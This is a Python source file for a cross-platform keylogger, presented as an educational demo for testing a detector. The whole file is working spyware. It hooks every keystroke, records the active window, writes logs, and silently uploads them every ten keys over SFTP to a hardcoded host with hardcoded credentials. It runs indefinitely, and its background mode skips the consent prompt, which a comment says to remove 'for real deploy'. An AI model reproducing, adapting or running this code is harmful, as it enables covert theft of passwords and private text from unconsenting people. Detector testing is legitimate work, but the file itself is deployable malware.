# keylogger_demo/simple_keylogger.py
"""
EDUCATIONAL KEYLOGGER - Demonstrates How Keyloggers Work (CROSS-PLATFORM, FULLY SILENT)
WARNING: This is for educational/research purposes ONLY
- Only use with explicit consent
- Only use on your own systems
- Never use for malicious purposes
This demonstrates the techniques your detector catches:
1. Keyboard hooking
2. File logging
3. Process hiding (commented out - for demo only)
4. Exfiltration via SCP (NEW: Demonstrates data theft techniques)
Supported: Windows, macOS, Linux
FULLY SILENT MODE: No prompts, no exfil output - runs indefinitely in background
"""
import keyboard
import os
import time
from datetime import datetime
from pathlib import Path
import psutil
import platform    # To detect OS for cross-platform support

# REQUIRED: For silent, password-based exfiltration (demo only - insecure!)
import paramiko  # pip install paramiko

# OS-specific imports
if platform.system() == "Windows":
    import win32gui
    import win32process
elif platform.system() == "Darwin":  # macOS
    try:
        from AppKit import NSWorkspace
    except ImportError:
        NSWorkspace = None
elif platform.system() == "Linux":
    try:
        from Xlib import display, X
    except ImportError:
        display = X = None

class SimpleKeylogger:
    """
    Educational keylogger demonstrating basic techniques (cross-platform, fully silent)
    """
  
    def __init__(self, log_dir="keylogger_logs", scp_user="kali", scp_password="kali", scp_dest_path="/home/kali/Desktop/client_Keylogs/", background=False):
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(exist_ok=True)
      
        self.log_file = self.log_dir / f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.buffer = []
        self.buffer_size = 10  # Write every 10 keystrokes
      
        # SCP Configuration (for exfiltration demo) - HARDCODED FOR DEMO (INSECURE!)
        self.scp_server = "192.168.56.10"
        self.scp_user = scp_user  # Fixed to 'kali'
        self.scp_password = scp_password  # Fixed to 'kali' (DEMO ONLY - NEVER DO THIS IN REAL CODE!)
        self.scp_dest_path = scp_dest_path  # Absolute path /home/kali/Desktop/client_Keylogs/
        self.scp_destination = f"{self.scp_user}@{self.scp_server}:{self.scp_dest_path}"
      
        self.os = platform.system()
        self.background = background  # Hide console if True (Windows: use pythonw.exe)
      
        if not self.background:
            print(f"Detected OS: {self.os}")
            print("="*60)
            print(" EDUCATIONAL CROSS-PLATFORM KEYLOGGER WITH EXFILTRATION")
            print("="*60)
            print("\n⚠️ WARNING: For Educational Purposes ONLY")
            print("This demonstrates techniques that your detector catches:\n")
            print(" 1. ✓ Keyboard Hook Detection")
            print(" 2. ✓ File System Monitoring")
            print(" 3. ✓ Process Behavior Analysis")
            print(" 4. ✓ NEW: Network Exfiltration (SCP to 192.168.56.10)")
            print("\n⚠️ FULLY SILENT MODE: No prompts/output during exfil - Runs indefinitely")
            print(f"📁 Remote target: {self.scp_dest_path} (absolute path)")
            print("\nStarting in 3 seconds...")
            time.sleep(3)
  
    def get_active_window(self):
        """Get currently active window info - Cross-platform, DETECTOR CATCHES THIS"""
        try:
            if self.os == "Windows":
                hwnd = win32gui.GetForegroundWindow()
                window_title = win32gui.GetWindowText(hwnd)
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                process = psutil.Process(pid)
                return {
                    'window': window_title,
                    'process': process.name(),
                    'pid': pid
                }
            elif self.os == "Darwin" and NSWorkspace:
                workspace = NSWorkspace.sharedWorkspace()
                active_app = workspace.frontmostApplication()
                window_title = active_app.localizedName() or "Unknown"
                pid = active_app.processIdentifier()
                process = psutil.Process(pid)
                return {
                    'window': window_title,
                    'process': process.name(),
                    'pid': pid
                }
            elif self.os == "Linux" and display:
                d = display.Display()
                root = d.screen().root
                active_window = root.GetFullProperty(d.intern_atom('_NET_ACTIVE_WINDOW'), X.AnyPropertyType).value[0]
                if active_window:
                    window_title = active_window.get_full_property(d.intern_atom('_NET_WM_NAME'), 0).value.decode('utf-8', errors='ignore') if hasattr(active_window, 'get_full_property') else "Unknown"
                else:
                    window_title = "Unknown"
                return {
                    'window': window_title,
                    'process': 'Unknown',
                    'pid': None
                }
            else:
                return {'window': 'Unknown', 'process': 'Unknown', 'pid': None}
        except Exception:
            return {'window': 'Unknown', 'process': 'Unknown', 'pid': None}
  
    def on_key_press(self, event):
        """
        Callback when key is pressed - SILENT
        DETECTOR CATCHES: Keyboard hook
        """
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        window_info = self.get_active_window()
      
        # Build log entry
        log_entry = {
            'time': timestamp,
            'key': event.name,
            'window': window_info['window'],
            'process': window_info['process']
        }
      
        # Add to buffer
        self.buffer.append(log_entry)
      
        # NO CONSOLE PRINT - Silent for victim
      
        # Write to file when buffer is full
        # DETECTOR CATCHES: Suspicious file writes
        if len(self.buffer) >= self.buffer_size:
            self.flush_to_file()
  
    def flush_to_file(self):
        """
        Write buffer to log file, then exfiltrate via SCP - FULLY SILENT
        DETECTOR CATCHES: Files with 'keylog' pattern + Outbound SSH/SCP
        """
        if not self.buffer:
            return
      
        with open(self.log_file, 'a', encoding='utf-8') as f:
            for entry in self.buffer:
                f.write(f"[{entry['time']}] Key: {entry['key']} | "
                       f"Window: {entry['window']} | Process: {entry['process']}\n")
       
        # SILENT: Exfiltrate the log file via SCP to attacker's server
        self.exfiltrate_via_scp()
       
        self.buffer.clear()
  
    def exfiltrate_via_scp(self):
        """
        Send the log file to the attacker's server via SFTP (FULLY SILENT, NO PROMPTS/OUTPUT)
        DETECTOR CATCHES: Suspicious outbound SSH/SCP traffic to hardcoded IP
        NOTE: Uses Paramiko for password auth (demo - hardcoded creds INSECURE!).
        NO OUTPUT/ERRORS - Fails silently (real malware retries).
        """
        if not self.log_file.exists():
            return  # Silent fail
       
        local_path = str(self.log_file)
        filename = self.log_file.name
        remote_dir = self.scp_dest_path  # Absolute: /home/kali/Desktop/client_Keylogs/
        remote_path = os.path.join(remote_dir, filename)
       
        try:
            # Create SSH transport and SFTP client (SILENT PASSWORD AUTH)
            transport = paramiko.Transport((self.scp_server, 22))
            transport.connect(username=self.scp_user, password=self.scp_password)  # Hardcoded, no prompt
            sftp = paramiko.SFTPClient.from_transport(transport)
            
            # Upload to remote path
            sftp.put(local_path, remote_path)
            
            sftp.close()
            transport.close()
            
            # SILENT SUCCESS - No print (attacker checks files)
            
        except Exception:
            # SILENT FAIL - No log/error (retry in real malware)
            pass
  
    def start(self):
        """
        Start keylogging INDEFINITELY until stopped (SILENT)
        """
        if not self.background:
            print(f"\n🔴 KEYLOGGER ACTIVE - Running indefinitely (silent mode)")
            print(f"📁 Logging to: {self.log_file}")
            print(f"📤 SILENT Exfiltrating to: {self.scp_destination}")
            print("\nType anything (no output shown)...")
            print("Background run: Use Ctrl+C to stop (or kill process)\n")
       
        # Hook keyboard - DETECTOR CATCHES THIS
        keyboard.on_press(self.on_key_press)
       
        try:
            # Keep script alive indefinitely - NEVER EXPIRES
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            if not self.background:
                print("\n\n⚠️ Stopped by user")
        finally:
            self.stop()
  
    def stop(self):
        """Stop keylogging and cleanup - SILENT FINAL EXFIL"""
        keyboard.unhook_all()
        self.flush_to_file()  # Silent final exfil
      
        if not self.background:
            print("\n" + "="*60)
            print(" KEYLOGGER STOPPED")
            print("="*60)
            print(f"\n✓ Log file: {self.log_file}")
            print(f"✓ Total size: {self.log_file.stat().st_size if self.log_file.exists() else 0} bytes")
            print("✓ SILENT Final exfil sent")
           
            # Show what detector would catch
            print("\n🛡️ YOUR DETECTOR WOULD CATCH:")
            print(" 1. ✓ Keyboard hook")
            print(" 2. ✓ Log file created in suspicious location")
            print(" 3. ✓ Process name contains 'keylog'")
            print(" 4. ✓ Frequent small file writes (buffer flushes)")
            print(" 5. ✓ Outbound SCP connection to 192.168.56.10")
            print(" 6. ✓ Hardcoded C2 IP in process memory")
            print(" 7. ✓ Hardcoded credentials in binary (strings analysis)")
            print("="*60)

def main():
    """Demo keylogger for testing your detector - FULLY SILENT VERSION"""
    import argparse
  
    parser = argparse.ArgumentParser(description="Educational Cross-Platform Keylogger Demo with Exfiltration")
    parser.add_argument('--log-dir', default='keylogger_logs',
                       help='Directory for log files')
    parser.add_argument('--scp-user', default='kali',
                       help='SCP username for exfiltration (default: kali)')
    parser.add_argument('--scp-password', default='kali',
                       help='SCP password for exfiltration (default: kali - DEMO ONLY!)')
    parser.add_argument('--scp-dest', default='/home/kali/Desktop/client_Keylogs/',
                       help='Remote SCP destination path (default: /home/kali/Desktop/client_Keylogs/ - absolute)')
    parser.add_argument('--background', action='store_true',
                       help='Run in background (silent, no console - Windows: use pythonw.exe)')
  
    args = parser.parse_args()
  
    # Consent warning (ONLY for demo - remove for real deploy)
    if not args.background:
        print("\n" + "="*60)
        print(" ⚠️ EDUCATIONAL USE ONLY - CONSENT REQUIRED")
        print("="*60)
        print("\nThis keylogger is for research/testing purposes.")
        print("It demonstrates techniques that malicious keyloggers use, INCLUDING DATA EXFILTRATION.")
        print("\nBy running this, you acknowledge:")
        print(" • This is YOUR system or you have permission")
        print(" • This is for educational/testing purposes")
        print(" • You will not use this maliciously")
        print(" • FULLY SILENT: No prompts/output - Exfils every 10 keys indefinitely")
    
        consent = input("\nDo you consent? (yes/no): ").strip().lower()
    
        if consent != 'yes':
            print("\n❌ Consent not given. Exiting.")
            return
  
    # Run keylogger
    logger = SimpleKeylogger(
        log_dir=args.log_dir,
        scp_user=args.scp_user,
        scp_password=args.scp_password,
        scp_dest_path=args.scp_dest,
        background=args.background
    )
    logger.start()

if __name__ == "__main__":
    main()